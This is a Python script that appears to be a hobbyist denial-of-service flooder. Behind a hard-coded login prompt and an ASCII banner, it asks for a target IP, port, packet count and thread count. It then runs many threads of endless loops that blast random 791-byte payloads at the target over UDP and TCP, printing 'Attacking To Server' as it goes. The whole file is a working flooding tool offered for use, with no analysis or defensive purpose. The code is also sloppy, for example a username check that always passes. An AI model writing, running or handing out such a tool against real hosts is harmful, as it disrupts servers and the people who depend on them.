import random
import socket
import threading
import time
import getpass
import os,sys
import random, socket, threading

user = "Admins" 
pasw = "syntax" 

for i in range(3):
    user = input(" Username : ")
    pwd = input(" Password : ")
    j = 3
    if (user == user):
      if (pwd == pasw):
        time.sleep(2)
        print("\033[0;31m[0] Loading.......")
        time.sleep(1)
        print("\033[0;32m[10] Loading......")
        time.sleep(1)
        print("\033[0;33m[20] Loading.......")
        time.sleep(1)
        print("\033[0;34m[30] Loading.......")
        time.sleep(1)
        print("\033[0;35m[40] Loading.......")
        time.sleep(1)
        print("\033[0;36m[50] Loading.......")
        time.sleep(1)
        print("\033[0;31m[60] Loading.......")
        time.sleep(1)
        print("\033[0;32m[70] Loading.......")
        time.sleep(1)
        print("\033[0;34m[80] Loading.......")
        time.sleep(1)
        print("\033[0;35m[90] Loading.......")
        time.sleep(1)
        print("\033\033[0;32m[100] Processing\n")
        time.sleep(3)
        break
    else:
        time.sleep(2)
        print("\033[0;36m[x] Wrong Password \n")
        continue
time.sleep(2)
print("Succesfull Logins")
time.sleep(2)

os.system("clear")
print(""""
\033[0;31m                 ██████ ▓██   ██▓ ███▄    █ ▄▄▄█████▓ ▄▄▄     ▒██   ██▒
\033[0;32m               ▒██    ▒  ▒██  ██▒ ██ ▀█   █ ▓  ██▒ ▓▒▒████▄   ▒▒ █ █ ▒░
\033[0;33m               ░ ▓██▄     ▒██ ██░▓██  ▀█ ██▒▒ ▓██░ ▒░▒██  ▀█▄ ░░  █   ░
\033[0;34m                 ▒   ██▒  ░ ▐██▓░▓██▒  ▐▌██▒░ ▓██▓ ░ ░██▄▄▄▄██ ░ █ █ ▒ 
\033[0;35m               ▒██████▒▒  ░ ██▒▓░▒██░   ▓██░  ▒██▒ ░  ▓█   ▓██▒██▒ ▒██▒
\033[0;36m               ▒ ▒▓▒ ▒ ░   ██▒▒▒ ░ ▒░   ▒ ▒   ▒ ░░    ▒▒   ▓▒█▒▒ ░ ░▓ ░
\033[0;37m               ░ ░▒  ░   ▓██ ░▒░ ░ ░░   ░ ▒░    ░      ░   ▒▒ ░░   ░▒ ░
\033[0;38m               ░  ░  ░   ▒ ▒ ░░     ░   ░ ░   ░ ░      ░   ▒   ░    ░  
\033[0;39m                     ░   ░ ░              ░                ░   ░    ░ 
""")
time.sleep(1)
print("\033[31m ╔══╗")
print("\033[31m ║IP║")
print("\033\31m╚══╝")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m ╔════╗")
print("\033[31m ║Port║")
print("\033\31m╚════╝")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m ╔═══════╗")
print("\033[31m ║Packets║")	
print("\033\31m╚═══════╝")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m ╔═══════╗")
print("\033[31m ║Threads║")
print("\033\31m╚═══════╝")
threads = int(input("┗━>\033[0m:"))
print("\033[31m━━━ Gas g? (y/n)")
choice = str(input("┗━>\033[0m:"))
def xxxxxxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxxxxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxxxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxxxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xxx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] Server Attack")

def xx():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

def x():
  data = random._urandom(791)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
        print(i +" \033[32m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      s.close()
      print("[!] Server Attack")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxxxxx)
    th.start()
    th = threading.Thread(target = xxxxxx)
    th.start()
    th = threading.Thread(target = xxxxx)
    th.start()
    th = threading.Thread(target = xxxx)
    th.start()
  else:
    th = threading.Thread(target = xxx)
    th.start()
    th = threading.Thread(target = xx)
    th.start()
    th = threading.Thread(target = x)
    th.start()